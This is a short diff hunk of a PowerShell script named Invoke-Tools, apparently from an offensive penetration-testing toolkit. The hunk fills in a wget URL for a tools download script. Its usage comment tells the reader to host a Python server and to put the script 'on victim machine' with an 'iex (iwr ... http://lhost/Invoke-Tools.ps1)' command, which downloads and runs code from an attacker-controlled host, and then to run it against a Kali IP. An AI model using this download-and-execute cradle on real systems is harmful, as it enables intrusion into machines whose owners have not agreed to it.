@@ -3,7 +3,7 @@ function Invoke-Tools{
 <# 
 Start python server on port 80 in your tools directory
 if you do not have all the tools, you can download shell script from following location
-wget 
+wget https://github.com/overgrowncarrot1/Invoke-Everything/blob/main/Windows-Tools.sh
 
 put script on victim machine with iex (iwr -usebasicparsing http://lhost/Invoke-Tools.ps1)
 run script with invoke-tools -lhost <kali IP>
